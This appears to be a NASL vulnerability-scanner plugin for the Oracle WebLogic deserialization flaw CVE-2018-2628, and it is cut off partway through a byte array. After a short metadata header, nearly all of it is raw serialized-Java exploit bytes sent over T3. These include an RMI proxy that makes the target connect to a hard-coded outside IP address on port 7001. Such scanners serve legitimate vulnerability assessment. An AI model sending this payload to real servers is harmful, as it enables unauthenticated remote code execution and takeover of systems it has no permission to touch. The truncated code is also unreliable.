include("compat.inc");

if(description){
	script_id(51799005);
	script_version ("$Revision: 0.1 $");
	script_cvs_date("$Date: 2018/04/18 13:37:00 $");

	script_cve_id("CVE-2018-2628");
	script_bugtraq_id(103776);
	# script_osvdb_id(40943);
	# script_xref(name:"RHSA", value:"2008:0031");

	script_name(english: "WebLogic Remote Code Execute(CVE-2018-2628)");
	script_summary(english: "Sends an unexpected Java object to the server.");

	script_set_attribute(attribute:"synopsis", value:
"The remote Oracle WebLogic server is affected by a remote code
execution vulnerability.");
	script_set_attribute(attribute:"description", value:
"Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Core Components).
Supported versions that are affected are 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3.
Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. ");
	script_set_attribute(attribute:"see_also", value:"http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html");
	script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/bid/103776");
	script_set_attribute(attribute:"see_also", value:"http://www.securitytracker.com/id/1040696");
	script_set_attribute(attribute:"solution", value:
	"Upgrade to the relevant fixed version referenced in the vendor
advisory.");

	script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
	script_set_attribute(attribute:"exploit_available", value:"true");
	# script_set_attribute(attribute:"exploit_framework_core", value:"true");
	# script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
	# script_set_attribute(attribute:"canvas_package", value:'CANVAS');

	script_set_attribute(attribute:"vuln_publication_date", value:"2018/04/18");
	script_set_attribute(attribute:"patch_publication_date", value:"2018/04/18");
	script_set_attribute(attribute:"plugin_publication_date", value:"2018/04/20");
	script_set_attribute(attribute:"plugin_modification_date", value:"2018/04/20");

	script_set_attribute(attribute:"plugin_type", value:"remote");
	script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:weblogic_server");
	# script_set_attribute(attribute:"in_the_news", value:"true");
	# script_set_attribute(attribute:"stig_severity", value:"C");

	script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
	script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
	script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
	script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
	script_set_attribute(attribute:"risk_factor", value: "High" );

	script_end_attributes();

	script_category(ACT_ATTACK);
	script_family(english:"Web Servers");

	script_copyright(english:"This script is Copyright (C) dec0y");

	script_dependencies("weblogic_detect.nasl","t3_detect.nasl");
  script_require_ports("Services/t3", 7001);

	exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");
include("http.inc");
include("t3.inc");

appname = "Oracle WebLogic Server";

port = get_service(svc:'t3', default:7001, exit_on_fail:TRUE);
# get_kb_item_or_exit("www/weblogic");
# port = -1;
# if(isnull(get_kb_item("www/weblogic/7001/installed")))
# {
# 	ports = get_kb_list("Services/www");
# 	if(isnull(ports)) audit(AUDIT_INST_VER_NOT_VULN, appname);
# 	foreach p (ports)
# 	{
# 		if(!isnull(get_kb_item("www/weblogic/" + p + "/installed")))
# 		{
# 			port = p;
# 			break;
# 		}
# 	}
# }
# else
# {
# 	port = 7001;
# }
# display(port);
# if(port == -1) audit(AUDIT_INST_VER_NOT_VULN, appname);

host = get_host_name();

# sock = open_sock_tcp(port);
# if (!sock) audit(AUDIT_SOCK_FAIL, port);

# version = t3_connect(sock:sock);
# close(sock);
# if(!isnull(version) &&
# 	"10.3.6.0" >!< version &&
# 	"12.1.3.0" >!< version &&
# 	"12.2.1.2" >!< version &&
# 	"12.2.1.3" >!< version) {
# 	audit(AUDIT_INST_VER_NOT_VULN, appname, version);
# }

# display("WebLogic version: " + version + "\n");

sock = open_sock_tcp(port, timeout:15);
if (!sock) audit(AUDIT_SOCK_FAIL, port);
data = raw_string(
    0x74, 0x33, 0x20, 0x31, 0x32, 0x2e, 0x32, 0x2e, 0x31, 0x0a, 0x41, 0x53, 0x3a, 0x32, 0x35, 0x35,
    0x0a, 0x48, 0x4c, 0x3a, 0x31, 0x39, 0x0a, 0x4d, 0x53, 0x3a, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30,
    0x30, 0x30, 0x0a, 0x0a
);
send(socket:sock, data:data);
data = recv(socket:sock, length:1024, timeout:15);
# display("Handshake successful\n");

data = raw_string(
    0x00, 0x00, 0x05, 0xc3, 0x01, 0x65, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00,
    0x00, 0x00, 0x6a, 0x00, 0x00, 0xea, 0x60, 0x00, 0x00, 0x00, 0x19, 0x00, 0x93, 0x7b, 0x48, 0x4a,
    0x56, 0xfa, 0x4a, 0x77, 0x76, 0x66, 0xf5, 0x81, 0xda, 0xa4, 0xf5, 0xb9, 0x0e, 0x2a, 0xeb, 0xfc,
    0x60, 0x74, 0x99, 0xb4, 0x02, 0x79, 0x73, 0x72, 0x00, 0x78, 0x72, 0x01, 0x78, 0x72, 0x02, 0x78,
    0x70, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x06, 0x00, 0x70, 0x70, 0x70, 0x70, 0x70, 0x70, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x03,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x70, 0x06, 0xfe, 0x01, 0x00, 0x00, 0xac,
    0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e,
    0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45,
    0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78,
    0x70, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d,
    0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x61, 0x63,
    0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7, 0xb8, 0xae, 0x1e, 0xc9,
    0x02, 0x00, 0x08, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69,
    0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74,
    0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b,
    0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63,
    0x68, 0x4c, 0x00, 0x09, 0x69, 0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c, 0x65, 0x74, 0x00, 0x12,
    0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e,
    0x67, 0x3b, 0x4c, 0x00, 0x0a, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e, 0x64, 0x6f, 0x72, 0x71,
    0x00, 0x7e, 0x00, 0x03, 0x4c, 0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x72, 0x73, 0x69,
    0x6f, 0x6e, 0x71, 0x00, 0x7e, 0x00, 0x03, 0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01,
    0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67,
    0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62,
    0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c,
    0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e,
    0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e,
    0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x97, 0x22, 0x45, 0x51, 0x64,
    0x52, 0x46, 0x3e, 0x02, 0x00, 0x03, 0x5b, 0x00, 0x08, 0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65,
    0x73, 0x74, 0x00, 0x27, 0x5b, 0x4c, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2f, 0x63,
    0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2f, 0x50,
    0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0x3b, 0x4c, 0x00, 0x0e, 0x72, 0x65,
    0x6c, 0x65, 0x61, 0x73, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x74, 0x00, 0x12, 0x4c,
    0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67,
    0x3b, 0x5b, 0x00, 0x12, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x41,
    0x73, 0x42, 0x79, 0x74, 0x65, 0x73, 0x74, 0x00, 0x02, 0x5b, 0x42, 0x78, 0x72, 0x00, 0x24, 0x77,
    0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69,
    0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49,
    0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7, 0xb8, 0xae, 0x1e, 0xc9, 0x02, 0x00, 0x08, 0x49, 0x00,
    0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00,
    0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b,
    0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65,
    0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x4c, 0x00, 0x09, 0x69,
    0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c, 0x65, 0x71, 0x00, 0x7e, 0x00, 0x04, 0x4c, 0x00, 0x0a,
    0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e, 0x64, 0x6f, 0x72, 0x71, 0x00, 0x7e, 0x00, 0x04, 0x4c,
    0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x71, 0x00, 0x7e,
    0x00, 0x04, 0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00,
    0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a,
    0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74,
    0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72,
    0x00, 0x21, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f,
    0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x65, 0x65, 0x72, 0x49,
    0x6e, 0x66, 0x6f, 0x58, 0x54, 0x74, 0xf3, 0x9b, 0xc9, 0x08, 0xf1, 0x02, 0x00, 0x06, 0x49, 0x00,
    0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00,
    0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b,
    0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65,
    0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x5b, 0x00, 0x08, 0x70,
    0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73, 0x74, 0x00, 0x27, 0x5b, 0x4c, 0x77, 0x65, 0x62, 0x6c,
    0x6f, 0x67, 0x69, 0x63, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x69, 0x6e, 0x74, 0x65,
    0x72, 0x6e, 0x61, 0x6c, 0x2f, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f,
    0x3b, 0x78, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f,
    0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x56, 0x65,
    0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x97, 0x22, 0x45, 0x51, 0x64, 0x52, 0x46,
    0x3e, 0x02, 0x00, 0x03, 0x5b, 0x00, 0x08, 0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73, 0x71
);
send(socket:sock, data:data);
# display("Send request payload-1 successful\n");

data = raw_string(
    0x00, 0x7e, 0x00, 0x03, 0x4c, 0x00, 0x0e, 0x72, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x56, 0x65,
    0x72, 0x73, 0x69, 0x6f, 0x6e, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61,
    0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x5b, 0x00, 0x12, 0x76, 0x65, 0x72,
    0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x41, 0x73, 0x42, 0x79, 0x74, 0x65, 0x73, 0x74,
    0x00, 0x02, 0x5b, 0x42, 0x78, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63,
    0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c,
    0x2e, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7,
    0xb8, 0xae, 0x1e, 0xc9, 0x02, 0x00, 0x08, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49,
    0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e,
    0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65,
    0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79,
    0x50, 0x61, 0x74, 0x63, 0x68, 0x4c, 0x00, 0x09, 0x69, 0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c,
    0x65, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x4c, 0x00, 0x0a, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e,
    0x64, 0x6f, 0x72, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x4c, 0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56,
    0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x78, 0x70, 0x77, 0x02, 0x00,
    0x00, 0x78, 0xfe, 0x00, 0xff, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00,
    0x13, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x4a,
    0x56, 0x4d, 0x49, 0x44, 0xdc, 0x49, 0xc2, 0x3e, 0xde, 0x12, 0x1e, 0x2a, 0x0c, 0x00, 0x00, 0x78,
    0x70, 0x77, 0x50, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x31, 0x39,
    0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x32, 0x32, 0x37, 0x00, 0x12, 0x57, 0x49, 0x4e,
    0x2d, 0x41, 0x47, 0x44, 0x4d, 0x56, 0x51, 0x55, 0x42, 0x31, 0x54, 0x36, 0x2e, 0x65, 0x68, 0x83,
    0x34, 0x8c, 0xd6, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00
);
data += raw_string(port/256);
data += raw_string(port%256);
data += raw_string(
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00,
    0x05, 0x73, 0x72, 0x00, 0x13, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a,
    0x76, 0x6d, 0x2e, 0x4a, 0x56, 0x4d, 0x49, 0x44, 0xdc, 0x49, 0xc2, 0x3e, 0xde, 0x12, 0x1e, 0x2a,
    0x0c, 0x00, 0x00, 0x78, 0x70, 0x77, 0x20, 0x01, 0x14, 0xdc, 0x42, 0xbd, 0x07
);
send(socket:sock, data:data);
# display("Send request payload-2 successful\n");

data = raw_string(
    0x1a, 0x77, 0x27, 0x00, 0x0d, 0x32, 0x34, 0x32, 0x2e, 0x32, 0x31, 0x34
);
send(socket:sock, data:data);
# display("Send request payload-3 successful\n");

data = raw_string(
    0x2e, 0x31, 0x2e, 0x32, 0x35, 0x34, 0x61, 0x86, 0x3d, 0x1d, 0x00, 0x00, 0x00, 0x00, 0x78
);
send(socket:sock, data:data);
# display("Send request payload-4 successful\n");

data = recv(socket:sock, length:2048, timeout:15);
# display("Recv length: " + strlen(data) + "\n");

data = raw_string(
    0x05, 0x65, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x00, 0x5d, 0x01,
    0x01, 0x00, 0x73, 0x72, 0x01, 0x78, 0x70, 0x73, 0x72, 0x02, 0x78, 0x70, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x75, 0x72, 0x03, 0x78, 0x70, 0x00, 0x00, 0x00, 0x00, 0x78, 0x74, 0x00,
    0x08, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x75, 0x72, 0x04, 0x78, 0x70, 0x00, 0x00,
    0x00, 0x0c, 0x9c, 0x97, 0x9a, 0x9a, 0x8c, 0x9a, 0x9b, 0xcf, 0xcf, 0x9b, 0x93, 0x9a, 0x74, 0x00,
    0x08, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x06, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed,
    0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72,
    0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e,
    0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70,
    0x72, 0x00, 0x02, 0x5b, 0x42, 0xac, 0xf3, 0x17, 0xf8, 0x06, 0x08, 0x54, 0xe0, 0x02, 0x00, 0x00,
    0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73,
    0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d,
    0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79,
    0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x13,
    0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x4f, 0x62, 0x6a, 0x65,
    0x63, 0x74, 0x3b, 0x90, 0xce, 0x58, 0x9f, 0x10, 0x73, 0x29, 0x6c, 0x02, 0x00, 0x00, 0x78, 0x70,
    0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00,
    0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43,
    0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52,
    0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x10, 0x6a, 0x61,
    0x76, 0x61, 0x2e, 0x75, 0x74, 0x69, 0x6c, 0x2e, 0x56, 0x65, 0x63, 0x74, 0x6f, 0x72, 0xd9, 0x97,
    0x7d, 0x5b, 0x80, 0x3b, 0xaf, 0x01, 0x03, 0x00, 0x03, 0x49, 0x00, 0x11, 0x63, 0x61, 0x70, 0x61,
    0x63, 0x69, 0x74, 0x79, 0x49, 0x6e, 0x63, 0x72, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x49, 0x00, 0x0c,
    0x65, 0x6c, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x5b, 0x00, 0x0b, 0x65,
    0x6c, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x44, 0x61, 0x74, 0x61, 0x74, 0x00, 0x13, 0x5b, 0x4c, 0x6a,
    0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3b,
    0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00
);
data += raw_string(
    0xac, 0xed, 0x00, 0x05, 0x73, 0x7d, 0x00, 0x00, 0x00, 0x01, 0x00, 0x1d, 0x6a, 0x61, 0x76, 0x61,
    0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x61, 0x63, 0x74, 0x69, 0x76, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2e,
    0x41, 0x63, 0x74, 0x69, 0x76, 0x61, 0x74, 0x6f, 0x72, 0x78, 0x72, 0x00, 0x17, 0x6a, 0x61, 0x76,
    0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x72, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x2e, 0x50,
    0x72, 0x6f, 0x78, 0x79, 0xe1, 0x27, 0xda, 0x20, 0xcc, 0x10, 0x43, 0xcb, 0x02, 0x00, 0x01, 0x4c,
    0x00, 0x01, 0x68, 0x74, 0x00, 0x25, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67,
    0x2f, 0x72, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x2f, 0x49, 0x6e, 0x76, 0x6f, 0x63, 0x61, 0x74,
    0x69, 0x6f, 0x6e, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x3b, 0x78, 0x70, 0x73, 0x72, 0x00,
    0x2d, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72,
    0x2e, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x49, 0x6e, 0x76,
    0x6f, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x00, 0x78, 0x72, 0x00, 0x1c, 0x6a, 0x61, 0x76,
    0x61, 0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2e, 0x52, 0x65, 0x6d,
    0x6f, 0x74, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0xd3, 0x61, 0xb4, 0x91, 0x0c, 0x61, 0x33,
    0x1e, 0x03, 0x00, 0x00, 0x78, 0x70, 0x77, 0x37, 0x00, 0x0a, 0x55, 0x6e, 0x69, 0x63, 0x61, 0x73,
    0x74, 0x52, 0x65, 0x66, 0x00, 0x0e, 0x31, 0x30, 0x34, 0x2e, 0x32, 0x35, 0x31, 0x2e, 0x32, 0x32,
    0x38, 0x2e, 0x35, 0x30, 0x00, 0x00, 0x1b, 0x59, 0x00, 0x00, 0x00, 0x00, 0x01, 0xee, 0xa9, 0x0b,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78
);
data += raw_string(
    0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x25, 0x77, 0x65, 0x62, 0x6c,
    0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x49, 0x6d, 0x6d, 0x75, 0x74, 0x61,
    0x62, 0x6c, 0x65, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78,
    0x74, 0xdd, 0xcb, 0xa8, 0x70, 0x63, 0x86, 0xf0, 0xba, 0x0c, 0x00, 0x00, 0x78, 0x72, 0x00, 0x29,
    0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x70, 0x72, 0x6f,
    0x76, 0x69, 0x64, 0x65, 0x72, 0x2e, 0x42, 0x61, 0x73, 0x69, 0x63, 0x53, 0x65, 0x72, 0x76, 0x69,
    0x63, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0xe4, 0x63, 0x22, 0x36, 0xc5, 0xd4, 0xa7,
    0x1e, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x77, 0x02, 0x06, 0x00, 0x73, 0x72, 0x00, 0x26, 0x77, 0x65,
